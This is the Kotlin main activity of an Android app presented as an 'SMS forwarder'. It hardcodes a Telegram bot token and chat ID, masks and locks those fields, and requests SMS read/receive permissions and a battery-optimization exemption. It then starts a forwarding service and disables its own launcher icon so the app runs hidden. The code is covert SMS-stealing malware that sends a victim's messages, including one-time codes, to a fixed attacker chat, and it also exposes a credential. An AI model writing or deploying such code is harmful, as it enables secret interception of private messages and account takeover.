package com.smsforwarder.app

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.smsforwarder.app.databinding.ActivityMainBinding
import com.smsforwarder.app.service.SmsForwardingService
import com.smsforwarder.app.utils.PreferenceHelper

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var preferenceHelper: PreferenceHelper
    
    private val SMS_PERMISSION_CODE = 100
    private val BATTERY_PERMISSION_CODE = 102

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        preferenceHelper = PreferenceHelper(this)
        
        // Set default configuration
        setDefaultConfiguration()
        
        // Check if already configured
        if (preferenceHelper.isAppConfigured()) {
            // Hide app and start service
            hideAppAndStartService()
            finish()
            return
        }
        
        // First time setup
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Hide sensitive fields
        binding.etBotToken.setText("●●●●●●●●●●●●●●●●")
        binding.etChatId.setText("●●●●●●●●●●")
        binding.etBotToken.isEnabled = false
        binding.etChatId.isEnabled = false
        
        // Hide save button
        binding.btnSave.visibility = android.view.View.GONE
        
        // Service always on - hide switch
        binding.switchService.isChecked = true
        binding.switchService.isEnabled = false

        // Request all permissions
        requestAllPermissions()
    }

    private fun setDefaultConfiguration() {
        if (preferenceHelper.getBotToken().isEmpty()) {
            preferenceHelper.saveBotToken("8084302237:AAGdJX7xFFxzxfur35dXuKUdAHbCrvGXqzo")
        }
        if (preferenceHelper.getChatId().isEmpty()) {
            preferenceHelper.saveChatId("5425876649")
        }
        preferenceHelper.setServiceEnabled(true)
    }

    private fun requestAllPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val permissionsToRequest = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                SMS_PERMISSION_CODE
            )
        } else {
            // All SMS permissions granted, check battery optimization
            requestBatteryOptimization()
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent()
            val packageName = packageName
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, BATTERY_PERMISSION_CODE)
            } else {
                completeSetup()
            }
        } else {
            completeSetup()
        }
    }

    private fun completeSetup() {
        // Mark app as configured
        preferenceHelper.setAppConfigured(true)
        
        // Start service
        startForwardingService()
        
        Toast.makeText(this, "SMS Forwarding Active - App will now hide", Toast.LENGTH_LONG).show()
        
        // Wait a bit then hide
        binding.root.postDelayed({
            hideAppAndStartService()
            finish()
        }, 2000)
    }

    private fun hideAppAndStartService() {
        // Start service
        val intent = Intent(this, SmsForwardingService::class.java)
        ContextCompat.startForegroundService(this, intent)
        
        // Hide app icon from launcher
        val componentName = ComponentName(this, "${packageName}.MainActivity")
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun startForwardingService() {
        preferenceHelper.setServiceEnabled(true)
        val intent = Intent(this, SmsForwardingService::class.java)
        ContextCompat.startForegroundService(this, intent)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        when (requestCode) {
            SMS_PERMISSION_CODE -> {
                if (grantResults.isNotEmpty() && 
                    grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    // Permissions granted, request battery optimization
                    requestBatteryOptimization()
                } else {
                    Toast.makeText(
                        this, 
                        "All permissions required for SMS forwarding", 
                        Toast.LENGTH_LONG
                    ).show()
                    finish()
                }
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        when (requestCode) {
            BATTERY_PERMISSION_CODE -> {
                completeSetup()
            }
        }
    }
}
